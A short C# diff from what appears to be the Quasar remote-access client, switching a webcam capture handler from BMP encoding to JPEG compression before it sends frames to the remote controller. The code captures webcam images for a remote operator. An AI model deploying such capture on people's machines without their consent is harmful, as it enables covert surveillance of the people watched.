@@ -13,6 +13,7 @@ using System.Threading.Tasks;
 using AForge.Video.DirectShow;
 using AForge.Video;
 using System.Windows.Forms;
+using Quasar.Common.Video.Compression;
 
 namespace Quasar.Client.Messages
 {
@@ -107,17 +108,15 @@ namespace Quasar.Client.Messages
 
             if (NeedsCapture)
             {
-                var image = (Bitmap)e.Frame.Clone();
-                using (var stream = new MemoryStream())
+                using (JpgCompression jpg = new JpgCompression(95))
                 {
-                    image.Save(stream, ImageFormat.Bmp);
+                    Bitmap image = (Bitmap)e.Frame.Clone();
                     _client.Send(new GetWebcamResponse
                     {
-                        Image = stream.ToArray(),
+                        Image = jpg.Compress(image),
                         Webcam = Webcam,
                         Resolution = Resolution
                     });
-                    stream.Close();
                 }
                 NeedsCapture = false;
             }
